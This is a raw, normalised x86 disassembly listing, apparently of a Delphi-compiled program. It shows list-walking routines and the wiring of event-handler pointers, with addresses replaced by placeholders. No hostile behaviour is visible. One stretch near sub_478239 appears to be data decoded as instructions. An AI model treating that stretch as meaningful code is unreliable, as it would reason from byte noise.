mov esi eax
cmp [ esi + 0x2dc ] 0x0
je r-xdata
cmp [ esi + 0x2e0 ] 0x0
je r-xdata
mov edx sub_477900
mov eax [ esi + 0x2dc ]
call sub_476f2c
mov eax [ esi + 0x2dc ]
call sub_403254
cmp [ esi + 0x2d8 ] 0x0
je r-xdata
mov edx sub_477900
mov eax [ esi + 0x2e0 ]
call sub_476f2c
mov eax [ esi + 0x2e0 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47129c
test bl bl
jle r-xdata
mov edx sub_477900
mov eax [ esi + 0x2d8 ]
call sub_476f2c
mov eax [ esi + 0x2d8 ]
call sub_403254
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_4779a0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x70 ]
xor eax eax
pop esi
pop ebx
pop ebp
retn
sub_4779c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edx sub_4779a0
mov eax [ ebx + 0x2d8 ]
call sub_476f2c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47673c
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4779f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x2d8 ]
call sub_477048
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4767dc
pop edi
pop esi
pop ebx
retn
sub_477a28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_477d88
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_477a6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477b1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_477bc8
xor eax eax
push ebp
push sub_477aec
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_477d88
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_4043b0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477af3
mov eax [ ebp - 0x4 ]
call sub_477bd0
retn
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_477df8
sub_477af3
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47682c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477b22
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
sub_477b2c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_477bb8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x28c ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_476858
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477bbf
lea eax [ ebp - 0x14 ]
call sub_403fa4
retn
mov eax [ ebp - 0xc ]
add eax 0x2
push eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_477d88
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
add ecx 0x2
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_4242f0
sub_477bd8
push ebx
push esi
mov esi eax
cmp [ esi + 0x2e0 ] 0x0
jne r-xdata
cmp [ esi + 0x24c ] 0x100
jle r-xdata
cmp [ esi + 0x21c ] 0x200
jle r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
cmp [ esi + 0x2d8 ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476e24
mov [ esi + 0x2dc ] eax
cmp [ esi + 0x2dc ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476e24
mov [ esi + 0x2e0 ] eax
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476e24
mov [ esi + 0x2d8 ] eax
sub_477c84
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x2e4 ] 0x0
jne r-xdata
mov [ ebx + 0x2e5 ] 0x1
mov ecx edi
mov edx esi
mov eax ebx
call sub_47372c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ ebx + 0x22c ]
jne r-xdata
cmp esi [ ebx + 0x228 ]
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
jne r-xdata
mov eax ebx
call sub_47172c
sub_477cd0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
cmp [ esp ] 0x0
je r-xdata
lea edi [ esi + 0x2dc ]
lea edi [ esi + 0x2e0 ]
jmp r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x0
je r-xdata
mov eax [ edi ]
mov edx ebp
call sub_476f38
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp + 0x1 ]
mov eax ebp
neg eax
dec eax
jmp r-xdata
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_477464
mov ebx eax
mov eax [ edi ]
mov ecx ebx
mov edx ebp
call sub_47709c
sub_477d34
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax [ ebx + 0x2d8 ]
call sub_476f38
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x200
jle r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_477114
mov esi eax
mov ecx esi
mov edx edi
mov eax [ ebx + 0x2d8 ]
call sub_47709c
sub_477d88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x2d8 ]
call sub_476f38
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax esi
call sub_403fa4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_477dcc
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x2d8 ]
call sub_476f38
test eax eax
jne r-xdata
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_477df8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_477d34
mov ecx [ ebp + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx esi
mov eax ebx
call sub_477cd0
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_477cd0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_477c84
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_477e48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_477d34
mov ecx [ ebp + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
mov cl 0x1
mov edx esi
mov eax ebx
call sub_477cd0
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_477cd0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_477c84
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_477e98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_477ebd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477ec4
retn
sub_478239
pop ss
inc esi
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f000f ] al
outsb
push ebx
je r-xdata
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax + 0xc004785 ] ah
push esp
dec ebp
jne r-xdata
imul ebp [ esi + 0x67 ] 0x6e616843
mov eax eax
mov al 0x82
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
add [ edi ] 0x0
add [ eax ] al
clc
je r-xdata
jmp [ edi + ecx * 4 + 0x5 ]
mov dl 0xf8
inc ebx
popad
jae r-xdata
pop esi
pop ebx
retn
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
add [ edi ] 0x40
add [ eax ] al
add [ esi + ecx * 4 + 0x7340041 ] bl
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
sbb [ edi - 0x5353ffb9 ] al
inc ecx
inc eax
add ah dh
add [ edi ] 0x7
or al 0x54
dec ebp
jne r-xdata
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
je r-xdata
cmp [ eax + 0x32 ] 0x0
inc ebx
popad
jae r-xdata
jb r-xdata
add [ ebx + eax ] bh
inc edx
add al cl
stosd [ edi ]
inc ecx
add [ esp + eax ] dl
inc edx
add al ah
add al [ edx ]
and al 0x4
inc edx
add [ eax + 0x74c0042 ] bl
add [ edi ] 0x98
pop [ ecx ]
add al [ eax ]
or [ ecx + 0x70 ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
jbe r-xdata
fmul [ ebx + 0x53ff3c43 ]
cmp [ ebx - 0x3d ] bl
mov eax eax
je r-xdata
pop ebx
retn
add [ eax ] al
nop
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ffc4
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
test bl bl
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_47857c
mov eax esi
add esp 0xc
call sub_4035d0
pop [ fs : 0x0 ]
sub_4783b4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
mov edx [ rw-data ]
call sub_4033e0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov ecx esi
mov edx edi
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_4783e4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_478404
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_443888
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47846e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_456ad8
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403254
retn
mov ebx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4784f0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_478518
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_47857c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_42b634
inc eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_42b5cc
sub_4785a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ rw-data ]
xor edx edx
mov eax ebx
call sub_41ffc4
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b42c
mov [ ebx + 0x30 ] eax
mov eax [ esi ]
mov [ eax + 0xc4 ] ebx
mov [ eax + 0xc0 ] sub_478854
mov eax [ esi ]
mov [ eax + 0xcc ] ebx
mov [ eax + 0xc8 ] sub_4788d0
mov eax [ esi ]
mov [ eax + 0x114 ] ebx
mov [ eax + 0x110 ] sub_47894c
mov eax [ esi ]
mov [ eax + 0x10c ] ebx
mov [ eax + 0x108 ] sub_4789c0
mov eax [ esi ]
mov [ eax + 0xd4 ] ebx
mov [ eax + 0xd0 ] sub_478a34
mov eax [ esi ]
mov [ eax + 0xf4 ] ebx
mov [ eax + 0xf0 ] sub_478af0
mov eax [ esi ]
mov [ eax + 0xfc ] ebx
mov [ eax + 0xf8 ] sub_478b8c
mov eax [ esi ]
mov [ eax + 0x104 ] ebx
mov [ eax + 0x100 ] sub_478c00
mov eax [ esi ]
mov [ eax + 0xdc ] ebx
mov [ eax + 0xd8 ] sub_478c7c
mov eax [ esi ]
mov [ eax + 0x11c ] ebx
mov [ eax + 0x118 ] sub_478cf8
mov eax [ esi ]
mov [ eax + 0x124 ] ebx
mov [ eax + 0x120 ] sub_478d6c
mov eax [ esi ]
mov [ eax + 0x134 ] ebx
mov [ eax + 0x130 ] sub_478e5c
mov eax [ esi ]
mov [ eax + 0x12c ] ebx
mov [ eax + 0x128 ] sub_478de0
mov eax [ esi ]
mov [ eax + 0x13c ] ebx
mov [ eax + 0x138 ] sub_478edc
mov eax [ esi ]
mov [ eax + 0xe4 ] ebx
mov [ eax + 0xe0 ] sub_478fcc
mov eax [ esi ]
mov [ eax + 0xec ] ebx
mov [ eax + 0xe8 ] sub_479040
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_478718
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xc0 ] ecx
mov [ edx + 0xc4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xc8 ] ecx
mov [ edx + 0xcc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x110 ] ecx
mov [ edx + 0x114 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x108 ] ecx
mov [ edx + 0x10c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xd0 ] ecx
mov [ edx + 0xd4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xf0 ] ecx
mov [ edx + 0xf4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xf8 ] ecx
mov [ edx + 0xfc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x100 ] ecx
mov [ edx + 0x104 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xd8 ] ecx
mov [ edx + 0xdc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x118 ] ecx
mov [ edx + 0x11c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x120 ] ecx
mov [ edx + 0x124 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x130 ] ecx
mov [ edx + 0x134 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x128 ] ecx
mov [ edx + 0x12c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x138 ] ecx
mov [ edx + 0x13c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xe0 ] ecx
mov [ edx + 0xe4 ] ecx
mov eax [ eax ]
xor edx edx
mov [ eax + 0xe8 ] edx
mov [ eax + 0xec ] edx
mov eax [ esi + 0x30 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_478854
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_4788c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4788c7
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov ecx edi
mov edx esi
call sub_478364
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4788d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_47893c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478943
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov ecx edi
mov edx esi
call sub_478378
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_47894c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_4789b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4789ba
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov edx esi
call sub_47838c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4789c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_478a27
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478a2e
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov edx esi
call sub_4783a0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_478a34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
mov [ ebp - 0x9 ] 0x0
xor eax eax
push ebp
push sub_478ae3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478aea
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4033e0
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov [ ebp - 0x9 ] 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_4783b4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_46af04
sub_478af0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_478b79
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478b80
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov ecx edi
mov edx esi
call sub_4783e4
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
sub_478b8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_478bf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478bfa
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov edx esi
call sub_478404
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_478c00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_478c6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478c73
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov ecx edi
mov edx esi
call sub_47847c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_478c7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_478ce8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478cef
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov ecx edi
mov edx esi
call sub_478490
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_478cf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_478d5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478d66
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov edx esi
call sub_4784a4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_478d6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_478dd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478dda
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov edx esi
call sub_4784b8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_478de0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_478e4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478e53
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov ecx edi
mov edx esi
call sub_4784d4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_478e5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_478ecc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
